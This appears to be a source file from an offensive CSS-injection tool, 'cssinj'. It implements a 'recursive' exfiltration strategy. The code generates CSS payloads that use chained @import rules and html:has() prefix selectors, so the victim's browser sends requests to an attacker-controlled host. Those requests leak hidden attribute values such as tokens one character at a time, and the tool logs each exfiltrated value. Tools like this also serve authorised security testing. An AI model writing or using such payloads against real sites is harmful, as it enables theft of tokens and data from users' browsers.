import urllib.parse

from cssinj.client import Client
from cssinj.console import Console, LogLevel
from cssinj.strategies.base import BaseExfiltrationStrategy
from cssinj.utils import default
from cssinj.utils.dom import Attribute, Element


class RecursiveStrategy(BaseExfiltrationStrategy):
    """
    Recursive exfiltration strategy.
    Exfiltrates the DOM structure of the HTML using recursive imports.
    """

    name = 'recursive'

    def generate_start_payload(self, client: Client) -> str:
        return self._generate_import(client)

    def generate_next_payload(self, client: Client) -> str:
        stri = self._generate_import(client)

        elements_attributes = []
        for client_element in client.elements:
            for element_attribute in client_element.attributes:
                if element_attribute.name == self.attribute:
                    elements_attributes.append(element_attribute)

        # Check if the token is complete
        stri += f'html:has({self.element}[{self.attribute}={client.data!r}]'
        stri += f'{"".join([f":not({self.element}[{self.attribute}={elements_attribut.value!r}])" for elements_attribut in elements_attributes])})'
        stri += f'{"".join([":first-child" for i in range(client.counter)])}'
        stri += f'{{background:url("//{self.hostname}:{self.port}/e?n={client.counter}&cid={client.id}");}}'

        # Payload to extract the token
        not_attributes = ''.join(
            [
                f':not({self.element}[{self.attribute}={elements_attribut.value!r}])'
                for elements_attribut in elements_attributes
            ]
        )
        first_child = ':first-child' * client.counter
        stri += ''.join(
            f'html:has({self.element}[{self.attribute}^={client.data + x!r}]{not_attributes}{first_child}'
            f'{{background:url("//{self.hostname}:{self.port}/v?t={urllib.parse.quote_plus(client.data + x)}&cid={client.id}");}}'
            for x in default.PRINTABLE
        )
        return stri

    def handle_valid(self, client: Client, data: str) -> str:
        # Replace data (recursive gets the full accumulated value each time)
        client.data = data
        return 'valid'

    def handle_end(self, client: Client) -> str:
        element = Element(name=self.element)
        element.attributes.append(Attribute(name=self.attribute, value=client.data))
        client.elements.append(element)
        Console.log(
            LogLevel.END_EXFILTRATION,
            f'[{client.id}] - The {self.attribute} exfiltrated from {self.element} is : {client.data}',
        )
        client.data = ''
        return 'end'

    def _generate_import(self, client: Client) -> str:
        return f"@import url('//{self.hostname}:{self.port}/n?n={client.counter}&cid={client.id}');"
